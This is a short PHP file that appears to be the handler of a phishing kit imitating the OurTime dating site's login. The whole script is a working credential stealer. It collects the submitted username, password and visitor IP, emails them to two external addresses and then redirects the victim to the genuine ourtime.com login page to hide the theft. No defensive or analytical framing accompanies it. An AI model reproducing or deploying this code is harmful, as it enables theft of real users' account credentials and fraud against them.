<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || ourtime new login || :------\n";
$message .= "user: ".$_POST['formtext1']."\n";
$message .= "Password: ".$_POST['formtext2']."\n";
$message .= "----: || OLAMMY || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="williamslinda448@aol.com,williamslinda8417@gmail.com";
$subject = "tare | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: https://www.ourtime.com/v3/login");
?>